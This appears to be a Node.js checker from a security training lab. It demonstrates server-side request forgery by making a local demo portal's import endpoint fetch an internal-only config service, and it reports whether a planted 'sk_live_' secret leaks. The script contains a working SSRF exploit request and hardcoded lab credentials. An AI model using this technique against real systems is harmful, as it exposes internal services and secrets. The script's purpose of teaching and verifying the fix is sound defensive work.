// Module 4 — beat S standalone demo checker (SSRF → internal secrets).
// Separate so it can be SHOWN on its own. Usage: node checker/check-ssrf.mjs
//   (or setup menu → "d")

const PORTAL = process.env.BASE ?? "http://localhost:3004";
const ATTACKER = { username: "andrej", password: "andrej12345" };
// Internal-only service, not reachable from the host — only via the portal.
// (Overridable for local, non-Docker runs where the hostname differs.)
const INTERNAL_TARGET = process.env.SSRF_TARGET ?? "http://integrations:3000/config";
const SECRET_MARKER = "SSRF-TROPHY";

const green = (s) => `\x1b[32m${s}\x1b[0m`;
const red = (s) => `\x1b[31m${s}\x1b[0m`;
const dim = (s) => `\x1b[2m${s}\x1b[0m`;
const bold = (s) => `\x1b[1m${s}\x1b[0m`;
const line = (ok, t) => console.log(`  ${ok ? green("✔") : red("✗")} ${t}`);

async function finish(code) {
  process.exitCode = code;
  try {
    const d = globalThis[Symbol.for("undici.globalDispatcher.1")];
    if (d && typeof d.close === "function") await d.close();
  } catch {
    /* best effort */
  }
}

async function main() {
  console.log(bold(`\nModule 4 — beat S: SSRF into internal services (demo)`));
  console.log(dim(`Portal: ${PORTAL}\n`));

  let cookie;
  try {
    const r = await fetch(`${PORTAL}/api/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(ATTACKER),
    });
    if (!r.ok) throw new Error(`login failed (${r.status})`);
    cookie = (r.headers.getSetCookie?.() ?? []).map((c) => c.split(";")[0]).find((c) => c.startsWith("sid="));
  } catch (e) {
    console.log(red(`Cannot reach the portal at ${PORTAL}: ${e.message}`));
    await finish(2);
    return;
  }

  // Confirm the target is NOT reachable directly from here (host).
  let directBlocked = false;
  try {
    await fetch("http://localhost:3099/config"); // nothing published there
  } catch {
    directBlocked = true;
  }

  // Make the trusted portal fetch the internal-only service for us.
  const r = await fetch(`${PORTAL}/api/labs/import`, {
    method: "POST",
    headers: { "Content-Type": "application/json", Cookie: cookie },
    body: JSON.stringify({ url: INTERNAL_TARGET }),
  });
  const body = r.ok ? await r.text() : "";
  const grabbed = r.ok && body.includes(SECRET_MARKER);

  console.log(bold("Exploit — reach an internal-only service through the portal"));
  line(directBlocked, `The integrations service is not published to the host (unreachable directly).`);
  if (grabbed) {
    line(false, `SSRF via /api/labs/import fetched ${INTERNAL_TARGET} — internal secrets exfiltrated.`);
    const m = body.match(/sk_live_[A-Za-z0-9_]+/);
    if (m) console.log(dim(`      leaked: ${m[0]} …`));
    console.log(dim(`      → the portal is a proxy into the internal network. Allow-list egress.`));
  } else {
    line(true, `SSRF blocked — the portal won't fetch the internal service (HTTP ${r.status}).`);
  }

  console.log("");
  if (grabbed) {
    console.log(red(bold("❌ VULNERABLE — SSRF turns the trusted portal into your gateway inside.")));
  } else {
    console.log(green(bold("✅ SSRF blocked — outbound fetches are constrained.")));
  }
  console.log("");
  await finish(grabbed ? 1 : 0);
}

main();
